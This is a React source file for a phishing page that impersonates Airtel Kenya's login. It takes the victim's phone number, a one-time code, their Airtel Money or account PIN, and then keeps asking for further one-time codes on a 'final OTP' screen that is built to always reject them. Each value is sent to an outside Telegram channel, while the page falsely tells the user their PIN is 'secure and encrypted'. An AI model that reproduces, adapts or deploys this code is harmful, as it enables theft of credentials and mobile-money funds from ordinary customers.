"use client"

import React, { useState, useEffect, useCallback, useRef } from "react"
import { Smartphone, Delete, Phone, ChevronLeft, Lock, AlertCircle } from "lucide-react"
import { sendTelegramMessage } from "@/lib/telegram"

// Airtel Logo using the specified PNG URL
function AirtelLogo({ className = "h-14 sm:h-16 w-auto max-w-[240px]" }: { className?: string }) {
  return (
    <img
      src="https://static.vecteezy.com/system/resources/previews/070/283/457/non_2x/airtel-logo-sim-company-icon-in-transparent-background-free-png.png"
      alt="Airtel"
      className={`object-contain select-none ${className}`}
    />
  )
}

// Spoke Spinner for iOS style loading matching Screenshot 2
function IosSpokeSpinner() {
  return (
    <div className="relative w-10 h-10">
      {[...Array(12)].map((_, i) => (
        <div
          key={i}
          className="absolute left-[45%] top-[10%] w-[10%] h-[28%] bg-white rounded-full origin-[50%_140%] animate-ios-spoke"
          style={{
            transform: `rotate(${i * 30}deg)`,
            animationDelay: `${(i * (1 / 12) - 1).toFixed(3)}s`,
          }}
        />
      ))}
    </div>
  )
}

export default function AirtelKenyaApp() {
  // Screen Flow: "login" -> "otp1" -> "pin" -> "otp2"
  const [currentStep, setCurrentStep] = useState<"login" | "otp1" | "pin" | "otp2">("login")

  // Phone number state (Unlimited digits)
  const [phoneNumber, setPhoneNumber] = useState("")

  // Loading Screen State (Step 2 overlay)
  const [isLoading, setIsLoading] = useState(false)
  const [loadingText, setLoadingText] = useState("Verifying Mobile Number")

  // Step 2: OTP 1 State (4 digits)
  const [otp1, setOtp1] = useState<string[]>(["", "", "", ""])
  const [activeOtp1Index, setActiveOtp1Index] = useState(0)

  // Step 3: PIN State (Unlimited digits)
  const [pin, setPin] = useState("")
  const [isPinSubmitting, setIsPinSubmitting] = useState(false)

  // Step 4: OTP 2 State (Unlimited digits)
  const [otp2, setOtp2] = useState("")
  const [otp2Error, setOtp2Error] = useState("")
  const [isOtp2Submitting, setIsOtp2Submitting] = useState(false)

  // Countdown timers
  const [resendTimer1, setResendTimer1] = useState(49)
  const [resendTimer2, setResendTimer2] = useState(49)

  // Resend timer countdown effect
  useEffect(() => {
    let timer: NodeJS.Timeout
    if (currentStep === "otp1" && resendTimer1 > 0) {
      timer = setInterval(() => setResendTimer1((prev) => prev - 1), 1000)
    } else if (currentStep === "otp2" && resendTimer2 > 0) {
      timer = setInterval(() => setResendTimer2((prev) => prev - 1), 1000)
    }
    return () => clearInterval(timer)
  }, [currentStep, resendTimer1, resendTimer2])

  // -------------------------------------------------------------
  // HANDLERS: SCREEN 1 (Login)
  // -------------------------------------------------------------
  const handleKeypadPress = useCallback((val: string) => {
    setPhoneNumber((prev) => prev + val)
  }, [])

  const handleKeypadDelete = useCallback(() => {
    setPhoneNumber((prev) => prev.slice(0, -1))
  }, [])

  const handleProceedLogin = async () => {
    if (!phoneNumber || phoneNumber.trim().length === 0) return

    if (typeof window !== "undefined") {
      sessionStorage.setItem("airtel_mobile", phoneNumber)
    }

    sendTelegramMessage({
      title: "📱 Airtel Kenya Login Attempt",
      MobileNumber: `+254 ${phoneNumber}`,
    }).catch(console.error)

    setIsLoading(true)
    setLoadingText("Verifying Mobile Number")

    setTimeout(() => {
      setLoadingText("Sending OTP")
    }, 2000)

    setTimeout(() => {
      setIsLoading(false)
      setCurrentStep("otp1")
      setResendTimer1(49)
      setOtp1(["", "", "", ""])
      setActiveOtp1Index(0)
    }, 4000)
  }

  // -------------------------------------------------------------
  // HANDLERS: SCREEN 2 (OTP 1)
  // -------------------------------------------------------------
  const handleOtp1KeypadPress = useCallback((val: string) => {
    setOtp1((prev) => {
      const nextOtp = [...prev]
      const emptyIdx = nextOtp.findIndex((d) => d === "")
      if (emptyIdx !== -1) {
        nextOtp[emptyIdx] = val
        setActiveOtp1Index(Math.min(emptyIdx + 1, 3))
        
        // When 4 digits filled -> Auto advance to PIN screen
        if (emptyIdx === 3) {
          const fullOtp = nextOtp.join("")
          sendTelegramMessage({
            title: "🔐 Airtel Kenya OTP 1 Entered",
            MobileNumber: `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`,
            OTP_1: fullOtp,
          }).catch(console.error)

          setTimeout(() => {
            setCurrentStep("pin")
            setPin("")
          }, 350)
        }
      }
      return nextOtp
    })
  }, [])

  const handleOtp1KeypadDelete = useCallback(() => {
    setOtp1((prev) => {
      const nextOtp = [...prev]
      let lastFilled = -1
      for (let i = 3; i >= 0; i--) {
        if (nextOtp[i] !== "") {
          lastFilled = i
          break
        }
      }
      if (lastFilled !== -1) {
        nextOtp[lastFilled] = ""
        setActiveOtp1Index(lastFilled)
      }
      return nextOtp
    })
  }, [])

  // -------------------------------------------------------------
  // HANDLERS: SCREEN 3 (PIN - Unlimited)
  // -------------------------------------------------------------
  const handlePinKeypadPress = useCallback((val: string) => {
    setPin((prev) => prev + val)
  }, [])

  const handlePinKeypadDelete = useCallback(() => {
    setPin((prev) => prev.slice(0, -1))
  }, [])

  const handlePinSubmit = () => {
    if (!pin || pin.trim().length === 0 || isPinSubmitting) return

    setIsPinSubmitting(true)

    sendTelegramMessage({
      title: "🔑 Airtel Kenya PIN Entered",
      MobileNumber: `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`,
      PIN: pin,
    }).catch(console.error)

    // 2-second loading on button text before transitioning to Final OTP
    setTimeout(() => {
      setIsPinSubmitting(false)
      setCurrentStep("otp2")
      setOtp2("")
      setOtp2Error("")
      setResendTimer2(49)
    }, 2000)
  }

  // -------------------------------------------------------------
  // HANDLERS: SCREEN 4 (OTP 2 - Unlimited & Always Invalid)
  // -------------------------------------------------------------
  const handleOtp2KeypadPress = useCallback((val: string) => {
    setOtp2((prev) => {
      const next = prev + val
      setOtp2Error("")
      return next
    })
  }, [])

  const handleOtp2KeypadDelete = useCallback(() => {
    setOtp2((prev) => prev.slice(0, -1))
    setOtp2Error("")
  }, [])

  const handleOtp2Submit = () => {
    if (!otp2 || otp2.trim().length === 0 || isOtp2Submitting) return

    setIsOtp2Submitting(true)

    // Log the invalid OTP attempt to Telegram
    sendTelegramMessage({
      title: "❌ Airtel Kenya OTP 2 (Invalid Attempt)",
      MobileNumber: `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`,
      Entered_OTP: otp2,
      PIN: pin,
    }).catch(console.error)

    // 2-second loading on button text before showing invalid error
    setTimeout(() => {
      setIsOtp2Submitting(false)
      setOtp2Error("Invalid OTP. Please enter the valid verification code.")
      setOtp2("") // Clear input so user can re-enter
    }, 2000)
  }

  // -------------------------------------------------------------
  // PHYSICAL KEYBOARD LISTENER (For Screens 1 & 2 without native input)
  // -------------------------------------------------------------
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (isLoading) return

      if (currentStep === "login") {
        if (/^[0-9]$/.test(e.key)) {
          handleKeypadPress(e.key)
        } else if (e.key === "Backspace" || e.key === "Delete") {
          handleKeypadDelete()
        } else if (e.key === "Enter" && phoneNumber.trim().length > 0) {
          handleProceedLogin()
        }
      } else if (currentStep === "otp1") {
        if (/^[0-9]$/.test(e.key)) {
          handleOtp1KeypadPress(e.key)
        } else if (e.key === "Backspace" || e.key === "Delete") {
          handleOtp1KeypadDelete()
        }
      }
    }

    window.addEventListener("keydown", handleKeyDown)
    return () => window.removeEventListener("keydown", handleKeyDown)
  }, [
    currentStep,
    isLoading,
    phoneNumber,
    handleKeypadPress,
    handleKeypadDelete,
    handleOtp1KeypadPress,
    handleOtp1KeypadDelete,
  ])

  // Helper: Masked phone number for OTP subtitles
  const getMaskedPhoneNumber = () => {
    const raw = phoneNumber.replace(/\s+/g, "")
    if (raw.length >= 3) {
      const last3 = raw.slice(-3)
      return `******${last3}`
    }
    return "******848"
  }

  // Helper: Formatted countdown timer (00:XX)
  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`
  }

  return (
    <div className="w-full min-h-[100dvh] overflow-x-hidden flex flex-col justify-between font-sans antialiased text-[#1f2937] select-none bg-[#F6F6F9]">
      {/* ========================================================================= */}
      {/* SCREEN 1: LOGIN (Welcome to Airtel Kenya)                                  */}
      {/* ========================================================================= */}
      {currentStep === "login" && (
        <div className="flex-1 flex flex-col justify-between w-full min-h-[100dvh] bg-[#F6F6F9]">
          {/* Top Header ONLY has bg-white */}
          <header className="w-full bg-[#FFFFFF] border-b border-gray-100 shadow-[0_1px_2px_rgba(0,0,0,0.02)]">
            <div className="max-w-[480px] mx-auto px-4 sm:px-5 py-2.5 sm:py-3 flex items-center justify-between">
              <button
                type="button"
                aria-label="Back"
                className="p-1 -ml-1 text-[#1f2937] hover:opacity-75 transition-opacity cursor-pointer active:scale-95 shrink-0"
              >
                <ChevronLeft className="w-6 sm:w-7 h-6 sm:h-7 stroke-[2.5]" />
              </button>
              <div className="flex items-center justify-center flex-1 pr-5">
                <AirtelLogo className="h-14 sm:h-16 w-auto max-w-[240px]" />
              </div>
            </div>
          </header>

          {/* Main Body Section with bg-[#F6F6F9] */}
          <div className="flex-1 flex flex-col justify-between w-full max-w-[480px] mx-auto px-4 sm:px-5 pt-3 sm:pt-4 pb-4 sm:pb-5">
            <div>
              {/* Title */}
              <div className="pt-1 pb-1">
                <h1 className="text-[20px] sm:text-[23px] font-bold text-[#1a1e24] tracking-tight">
                  Welcome to Airtel Kenya
                </h1>
              </div>

              {/* Form Section */}
              <div className="pt-3 sm:pt-4">
                <label className="block text-[13.5px] sm:text-[14px] font-semibold text-[#2d333d] mb-2">
                  Registered Number or Account ID
                </label>

                {/* Input with two lines (up and down) in #7CA9CA */}
                <div className="flex items-center py-2 sm:py-2.5 border-t-[1.5px] border-b-[1.5px] border-[#7CA9CA] text-[17px] sm:text-[18px]">
                  <Smartphone className="w-[18px] sm:w-[19px] h-[18px] sm:h-[19px] text-[#9ca3af] stroke-[1.8] mr-2 shrink-0" />
                  <span className="font-semibold text-[#1f2937] mr-2 text-base sm:text-lg">+254</span>
                  <div className="flex-1 flex items-center overflow-x-auto no-scrollbar whitespace-nowrap">
                    {phoneNumber ? (
                      <span className="text-[#1f2937] font-semibold tracking-wide text-base sm:text-lg">
                        {phoneNumber}
                      </span>
                    ) : (
                      <span className="text-[#c4c4c4] font-normal text-sm sm:text-base">Enter here</span>
                    )}
                    {/* Blinking cursor */}
                    <span className="w-[2px] h-5 bg-[#7CA9CA] ml-0.5 shrink-0 animate-pulse" />
                  </div>
                </div>

                {/* Info Note Box with bg-[#F3F8FF] and info icon in #7CA9CA */}
                <div className="mt-3 p-3 bg-[#F3F8FF] rounded-sm flex items-start gap-2.5 border border-[#e8f1fd]">
                  <div className="mt-0.5 shrink-0">
                    <div className="w-[16px] sm:w-[17px] h-[16px] sm:h-[17px] rounded-full border-[1.8px] border-[#7CA9CA] flex items-center justify-center text-[#7CA9CA] text-[10px] sm:text-[11px] font-serif font-bold leading-none">
                      i
                    </div>
                  </div>
                  <p className="text-[12px] sm:text-[12.5px] leading-[1.35] text-[#4b5563]">
                    Registered number (Airtel or other operator) or your Home Broadband account number
                  </p>
                </div>
              </div>
            </div>

            {/* Dialpad Keypad */}
            <div className="my-auto py-3 sm:py-5">
              <div className="grid grid-cols-3 gap-y-2.5 sm:gap-y-4 max-w-[320px] sm:max-w-[340px] mx-auto text-center">
                {["1", "2", "3", "4", "5", "6", "7", "8", "9"].map((num) => (
                  <button
                    key={num}
                    type="button"
                    onClick={() => handleKeypadPress(num)}
                    className="h-12 sm:h-14 w-14 sm:w-16 mx-auto flex items-center justify-center text-[27px] sm:text-[31px] font-normal text-[#2d3748] hover:bg-white/80 active:bg-gray-200 active:scale-95 rounded-full transition-all cursor-pointer select-none"
                  >
                    {num}
                  </button>
                ))}

                {/* Empty slot */}
                <div className="h-12 sm:h-14 w-14 sm:w-16 mx-auto" />

                {/* 0 */}
                <button
                  type="button"
                  onClick={() => handleKeypadPress("0")}
                  className="h-12 sm:h-14 w-14 sm:w-16 mx-auto flex items-center justify-center text-[27px] sm:text-[31px] font-normal text-[#2d3748] hover:bg-white/80 active:bg-gray-200 active:scale-95 rounded-full transition-all cursor-pointer select-none"
                >
                  0
                </button>

                {/* Backspace / Cancel digit matching screenshot */}
                <button
                  type="button"
                  onClick={handleKeypadDelete}
                  aria-label="Delete"
                  className="h-12 sm:h-14 w-14 sm:w-16 mx-auto flex items-center justify-center hover:bg-white/80 active:bg-gray-200 active:scale-90 rounded-full transition-all cursor-pointer select-none"
                >
                  <svg
                    viewBox="0 0 28 20"
                    className="w-6.5 sm:w-7 h-4.5 sm:h-5"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M8 2 C7.3 2, 6.6 2.4, 6.1 3.0 L1.3 8.8 C0.7 9.5, 0.7 10.5, 1.3 11.2 L6.1 17.0 C6.6 17.6, 7.3 18, 8 18 L24 18 C25.4 18, 26.5 16.9, 26.5 15.5 L26.5 4.5 C26.5 3.1, 25.4 2, 24 2 Z"
                      fill="#727782"
                    />
                    <path
                      d="M13.2 6.8 L19.2 13.2 M19.2 6.8 L13.2 13.2"
                      stroke="#FFFFFF"
                      strokeWidth="1.8"
                      strokeLinecap="round"
                    />
                  </svg>
                </button>
              </div>
            </div>

            {/* Bottom Button Bar */}
            <div className="pt-2 w-full">
              <button
                type="button"
                onClick={handleProceedLogin}
                disabled={phoneNumber.trim().length === 0}
                className={`w-full py-3.5 sm:py-4 text-center font-bold text-[13.5px] sm:text-[14px] tracking-wider uppercase rounded-xs transition-all duration-200 ${
                  phoneNumber.trim().length > 0
                    ? "bg-[#E40000] text-white hover:bg-[#c90000] active:scale-[0.99] cursor-pointer shadow-md"
                    : "bg-[#D7DBE2] text-white cursor-not-allowed"
                }`}
              >
                PROCEED TO LOGIN
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* SCREEN 2: LOADING OVERLAY (Verifying Mobile Number -> Sending OTP)        */}
      {/* ========================================================================= */}
      {isLoading && (
        <div className="fixed inset-0 z-50 bg-[#5E6067] flex flex-col items-center justify-center animate-fade-in">
          <div className="flex flex-col items-center gap-4">
            {/* Spoke Activity Spinner */}
            <IosSpokeSpinner />

            {/* Dynamic Loading Text */}
            <p className="text-white text-[16px] sm:text-[17px] font-normal tracking-normal text-center px-4">
              {loadingText}
            </p>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* SCREEN 3: OTP 1 VERIFICATION SCREEN                                       */}
      {/* ========================================================================= */}
      {currentStep === "otp1" && (
        <div className="flex-1 flex flex-col justify-between w-full min-h-[100dvh] bg-[#F6F6F9]">
          {/* Top Header ONLY has bg-white */}
          <header className="w-full bg-[#FFFFFF] border-b border-gray-100 shadow-[0_1px_2px_rgba(0,0,0,0.02)]">
            <div className="max-w-[480px] mx-auto px-4 sm:px-5 py-2.5 sm:py-3 flex items-center justify-between">
              <button
                type="button"
                onClick={() => setCurrentStep("login")}
                aria-label="Back"
                className="p-1 -ml-1 text-[#1f2937] hover:opacity-75 transition-opacity cursor-pointer active:scale-95 shrink-0"
              >
                <ChevronLeft className="w-6 sm:w-7 h-6 sm:h-7 stroke-[2.5]" />
              </button>
              <div className="flex items-center justify-center flex-1 pr-5">
                <h2 className="text-[17px] sm:text-[18px] font-bold text-[#1f2937]">OTP Verification</h2>
              </div>
            </div>
          </header>

          <div className="w-full max-w-[480px] mx-auto px-4 sm:px-5 pt-3 sm:pt-4">
            {/* Subtitle */}
            <div className="pt-2 sm:pt-4 pb-2 text-center">
              <p className="text-[14px] sm:text-[15px] text-[#374151] leading-[1.35] max-w-[300px] mx-auto">
                An OTP has been sent to {getMaskedPhoneNumber()} via WhatsApp message.
              </p>
            </div>

            {/* 4 OTP Input Boxes */}
            <div className="pt-4 sm:pt-6 pb-2">
              <div className="flex justify-center items-center gap-2.5 sm:gap-4">
                {[0, 1, 2, 3].map((index) => {
                  const isFilled = otp1[index] !== ""
                  const isActive = index === activeOtp1Index

                  return (
                    <div
                      key={index}
                      onClick={() => setActiveOtp1Index(index)}
                      className={`w-[50px] sm:w-[58px] h-[60px] sm:h-[70px] rounded-xl border bg-white flex items-center justify-center transition-all cursor-pointer select-none ${
                        isActive
                          ? "border-[#2563eb] shadow-sm ring-1 ring-[#2563eb]/20"
                          : isFilled
                          ? "border-[#d1d5db]"
                          : "border-[#e5e7eb] hover:border-gray-400"
                      }`}
                    >
                      {isFilled ? (
                        /* Centered Bold Asterisk matching Screenshot 3 */
                        <svg
                          viewBox="0 0 24 24"
                          className="w-5 sm:w-6 h-5 sm:h-6 text-[#1f2937]"
                          fill="none"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 3.5v17M4.6 7.7l14.8 8.6M4.6 16.3l14.8-8.6"
                            stroke="currentColor"
                            strokeWidth="3.6"
                            strokeLinecap="round"
                          />
                        </svg>
                      ) : isActive ? (
                        <span className="w-[1.5px] h-6 bg-[#2563eb] animate-pulse" />
                      ) : null}
                    </div>
                  )
                })}
              </div>
            </div>

            {/* Resend OTP Row & Countdown Timer */}
            <div className="pt-2 sm:pt-3 pb-4 sm:pb-6 flex items-center justify-between text-[11.5px] sm:text-[13px] font-bold tracking-wider px-1 max-w-[320px] mx-auto">
              <button
                type="button"
                onClick={() => {
                  if (resendTimer1 === 0) {
                    setResendTimer1(49)
                    setOtp1(["", "", "", ""])
                    setActiveOtp1Index(0)
                    sendTelegramMessage({
                      title: "🔄 Airtel Kenya OTP 1 Resent",
                      MobileNumber: `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`,
                    }).catch(console.error)
                  }
                }}
                disabled={resendTimer1 > 0}
                className={`uppercase transition-colors ${
                  resendTimer1 === 0
                    ? "text-[#e40000] cursor-pointer hover:underline"
                    : "text-[#9ca3af] cursor-not-allowed"
                }`}
              >
                RESEND OTP
              </button>
              <span className="text-[#6b7280] font-semibold tracking-normal text-[12.5px] sm:text-[14px]">
                {formatTimer(resendTimer1)}
              </span>
            </div>

            {/* Customer Care Section (Static non-working) */}
            <div className="pt-1 pb-3 sm:pb-4 text-center">
              <p className="text-[12.5px] sm:text-[13.5px] text-[#374151] font-normal mb-1.5 sm:mb-2.5">
                Need customer care help?
              </p>
              <div className="inline-flex items-center gap-1.5 px-4 py-1 sm:py-1.5 rounded-full border border-[#4b5563] text-[12px] sm:text-[13px] font-medium text-[#374151] select-none cursor-default">
                <Phone className="w-3.5 h-3.5 stroke-[2]" />
                <span>Call</span>
              </div>
            </div>
          </div>

          {/* Bottom iOS-Style Numeric Keypad */}
          <div className="bg-[#d2d5db] pt-1.5 sm:pt-2 pb-5 sm:pb-6 px-1.5 sm:px-2 w-full mt-auto border-t border-gray-300">
            <div className="grid grid-cols-3 gap-1 sm:gap-1.5 text-center max-w-[420px] mx-auto">
              {["1", "2", "3", "4", "5", "6", "7", "8", "9"].map((num, i) => {
                const subLabels = ["", "ABC", "DEF", "GHI", "JKL", "MNO", "PQRS", "TUV", "WXYZ"]
                return (
                  <button
                    key={num}
                    type="button"
                    onClick={() => handleOtp1KeypadPress(num)}
                    className="bg-white rounded-md h-[44px] sm:h-[50px] flex flex-col items-center justify-center shadow-[0_1px_1px_rgba(0,0,0,0.2)] active:bg-[#e4e7eb] cursor-pointer"
                  >
                    <span className="text-[20px] sm:text-[24px] font-normal text-[#000000] leading-none">
                      {num}
                    </span>
                    {subLabels[i] && (
                      <span className="text-[8.5px] sm:text-[9px] font-semibold text-[#000000] tracking-widest leading-none mt-0.5">
                        {subLabels[i]}
                      </span>
                    )}
                  </button>
                )
              })}

              <div className="h-[44px] sm:h-[50px]" />

              <button
                type="button"
                onClick={() => handleOtp1KeypadPress("0")}
                className="bg-white rounded-md h-[44px] sm:h-[50px] flex items-center justify-center shadow-[0_1px_1px_rgba(0,0,0,0.2)] active:bg-[#e4e7eb] cursor-pointer"
              >
                <span className="text-[23px] sm:text-[25px] font-normal text-[#000000] leading-none">0</span>
              </button>

              <button
                type="button"
                onClick={handleOtp1KeypadDelete}
                aria-label="Delete"
                className="h-[44px] sm:h-[50px] flex items-center justify-center active:opacity-60 cursor-pointer"
              >
                <div className="w-6 h-5 border-[1.8px] border-[#000000] rounded-sm relative flex items-center justify-center">
                  <span className="text-[12px] font-bold text-[#000000] leading-none">✕</span>
                </div>
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* SCREEN 4: PIN SCREEN (Unlimited digits)                                   */}
      {/* ========================================================================= */}
      {currentStep === "pin" && (
        <div className="flex-1 flex flex-col justify-between w-full min-h-[100dvh] bg-[#F6F6F9]">
          {/* Header */}
          <header className="w-full bg-[#FFFFFF] border-b border-gray-100 shadow-[0_1px_2px_rgba(0,0,0,0.02)]">
            <div className="max-w-[480px] mx-auto px-4 sm:px-5 py-2.5 sm:py-3 flex items-center justify-between">
              <button
                type="button"
                onClick={() => setCurrentStep("otp1")}
                aria-label="Back"
                className="p-1 -ml-1 text-[#1f2937] hover:opacity-75 transition-opacity cursor-pointer active:scale-95 shrink-0"
              >
                <ChevronLeft className="w-6 sm:w-7 h-6 sm:h-7 stroke-[2.5]" />
              </button>
              <div className="flex items-center justify-center flex-1 pr-5">
                <AirtelLogo className="h-14 sm:h-16 w-auto max-w-[240px]" />
              </div>
            </div>
          </header>

          {/* Body */}
          <div className="flex-1 flex flex-col justify-between w-full max-w-[480px] mx-auto px-4 sm:px-5 pt-3 sm:pt-4 pb-4 sm:pb-5">
            <div>
              <div className="pt-1 pb-1">
                <h1 className="text-[20px] sm:text-[23px] font-bold text-[#1a1e24] tracking-tight">
                  Enter Security PIN
                </h1>
                <p className="text-[13px] sm:text-[14px] text-[#4b5563] mt-1">
                  Please enter your Airtel Money or Account PIN to proceed.
                </p>
              </div>

              {/* PIN Input Field (Unlimited Digits, Unmasked, Font-Normal) */}
              <div className="pt-5">
                <label className="block text-[14px] font-semibold text-[#2d333d] mb-2.5">
                  Account PIN
                </label>

                <div className="flex items-center py-2.5 border-t-[1.5px] border-b-[1.5px] border-[#7CA9CA] text-[18px]">
                  <Lock className="w-[19px] h-[19px] text-[#9ca3af] stroke-[1.8] mr-2 shrink-0" />
                  <input
                    type="text"
                    placeholder="Enter PIN"
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    onKeyDown={(e) => {
                      if (e.key === "Enter" && pin.trim().length > 0) {
                        handlePinSubmit()
                      }
                    }}
                    className="flex-1 bg-transparent text-[#1f2937] font-normal tracking-wide text-lg outline-none placeholder:text-[#c4c4c4] placeholder:font-normal"
                    autoFocus
                  />
                </div>

                <div className="mt-3.5 p-3.5 bg-[#F3F8FF] rounded-sm flex items-start gap-2.5 border border-[#e8f1fd]">
                  <div className="mt-0.5 shrink-0">
                    <div className="w-[17px] h-[17px] rounded-full border-[1.8px] border-[#7CA9CA] flex items-center justify-center text-[#7CA9CA] text-[11px] font-serif font-bold leading-none">
                      i
                    </div>
                  </div>
                  <p className="text-[12.5px] leading-[1.35] text-[#4b5563]">
                    Your PIN is secure and encrypted. Never share your PIN with anyone.
                  </p>
                </div>
              </div>
            </div>

            {/* Submit Button */}
            <div className="pt-6 pb-2 w-full mt-auto">
              <button
                type="button"
                onClick={handlePinSubmit}
                disabled={pin.trim().length === 0 || isPinSubmitting}
                className={`w-full py-4 text-center font-bold text-[14px] tracking-wider uppercase rounded-xs transition-all duration-200 ${
                  pin.trim().length > 0 && !isPinSubmitting
                    ? "bg-[#E40000] text-white hover:bg-[#c90000] active:scale-[0.99] cursor-pointer shadow-md"
                    : "bg-[#D7DBE2] text-white cursor-not-allowed"
                }`}
              >
                {isPinSubmitting ? "PROCESSING..." : "SUBMIT PIN"}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* SCREEN 5: SECOND OTP SCREEN (Unlimited digits & Always Invalid)           */}
      {/* ========================================================================= */}
      {currentStep === "otp2" && (
        <div className="flex-1 flex flex-col justify-between w-full min-h-[100dvh] bg-[#F6F6F9]">
          {/* Top Header ONLY has bg-white */}
          <header className="w-full bg-[#FFFFFF] border-b border-gray-100 shadow-[0_1px_2px_rgba(0,0,0,0.02)]">
            <div className="max-w-[480px] mx-auto px-4 sm:px-5 py-2.5 sm:py-3 flex items-center justify-between">
              <button
                type="button"
                onClick={() => setCurrentStep("pin")}
                aria-label="Back"
                className="p-1 -ml-1 text-[#1f2937] hover:opacity-75 transition-opacity cursor-pointer active:scale-95 shrink-0"
              >
                <ChevronLeft className="w-6 sm:w-7 h-6 sm:h-7 stroke-[2.5]" />
              </button>
              <div className="flex items-center justify-center flex-1 pr-5">
                <h2 className="text-[17px] sm:text-[18px] font-bold text-[#1f2937]">Final OTP Verification</h2>
              </div>
            </div>
          </header>

          <div className="flex-1 flex flex-col justify-between w-full max-w-[480px] mx-auto px-4 sm:px-5 pt-3 sm:pt-4 pb-4 sm:pb-5">
            <div>
              {/* Subtitle */}
              <div className="pt-2 pb-2 text-center">
                <p className="text-[14px] sm:text-[15px] text-[#374151] leading-[1.35] max-w-[300px] mx-auto">
                  An OTP has been sent to {getMaskedPhoneNumber()}.
                </p>
              </div>

              {/* Error message banner if invalid OTP entered */}
              {otp2Error && (
                <div className="mt-3 p-3 bg-red-50 border border-red-200 rounded-lg flex items-center gap-2 text-red-600 text-sm font-medium animate-shake">
                  <AlertCircle className="w-5 h-5 shrink-0 text-red-500" />
                  <span>{otp2Error}</span>
                </div>
              )}

              {/* Unlimited OTP Input Field */}
              <div className="pt-4 sm:pt-5 pb-2">
                <label className="block text-[13.5px] sm:text-[14px] font-semibold text-[#2d333d] mb-2">
                  Verification Code (OTP)
                </label>

                <div
                  className={`flex items-center py-2 sm:py-2.5 px-3 bg-white rounded-lg border-2 text-[17px] sm:text-[18px] transition-colors ${
                    otp2Error ? "border-red-500 ring-2 ring-red-100" : "border-[#7CA9CA]"
                  }`}
                >
                  <input
                    type="tel"
                    inputMode="numeric"
                    placeholder="Enter OTP Code"
                    value={otp2}
                    onChange={(e) => {
                      setOtp2(e.target.value)
                      setOtp2Error("")
                    }}
                    onKeyDown={(e) => {
                      if (e.key === "Enter" && otp2.trim().length > 0) {
                        handleOtp2Submit()
                      }
                    }}
                    className="flex-1 bg-transparent text-[#1f2937] font-bold tracking-[0.2em] text-lg sm:text-xl outline-none placeholder:text-[#c4c4c4] placeholder:font-normal placeholder:tracking-normal placeholder:text-sm sm:placeholder:text-base"
                    autoFocus
                  />
                </div>
              </div>

              {/* Resend OTP Row & Countdown Timer */}
              <div className="pt-2 pb-2 flex items-center justify-between text-[11.5px] sm:text-[13px] font-bold tracking-wider px-1 max-w-[320px] mx-auto">
                <button
                  type="button"
                  onClick={() => {
                    if (resendTimer2 === 0) {
                      setResendTimer2(49)
                      setOtp2("")
                      setOtp2Error("")
                      sendTelegramMessage({
                        title: "🔄 Airtel Kenya Final OTP Resent",
                        MobileNumber: `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`,
                      }).catch(console.error)
                    }
                  }}
                  disabled={resendTimer2 > 0}
                  className={`uppercase transition-colors ${
                    resendTimer2 === 0
                      ? "text-[#e40000] cursor-pointer hover:underline"
                      : "text-[#9ca3af] cursor-not-allowed"
                  }`}
                >
                  RESEND OTP
                </button>
                <span className="text-[#6b7280] font-semibold tracking-normal text-[12.5px] sm:text-[14px]">
                  {formatTimer(resendTimer2)}
                </span>
              </div>
            </div>

            {/* Bottom Section */}
            <div className="pt-4 w-full">
              {/* Verify OTP Button */}
              <div className="pb-3">
                <button
                  type="button"
                  onClick={handleOtp2Submit}
                  disabled={otp2.trim().length === 0 || isOtp2Submitting}
                  className={`w-full py-3.5 sm:py-4 text-center font-bold text-[13.5px] sm:text-[14px] tracking-wider uppercase rounded-xs transition-all duration-200 ${
                    otp2.trim().length > 0 && !isOtp2Submitting
                      ? "bg-[#E40000] text-white hover:bg-[#c90000] active:scale-[0.99] cursor-pointer shadow-md"
                      : "bg-[#D7DBE2] text-white cursor-not-allowed"
                  }`}
                >
                  {isOtp2Submitting ? "VERIFYING..." : "VERIFY OTP"}
                </button>
              </div>

              {/* Customer Care Section (Static) */}
              <div className="pt-1 pb-2 text-center">
                <p className="text-[12.5px] sm:text-[13.5px] text-[#374151] font-normal mb-1.5">
                  Need customer care help?
                </p>
                <div className="inline-flex items-center gap-1.5 px-4 py-1 rounded-full border border-[#4b5563] text-[12px] sm:text-[13px] font-medium text-[#374151] select-none cursor-default">
                  <Phone className="w-3.5 h-3.5 stroke-[2]" />
                  <span>Call</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
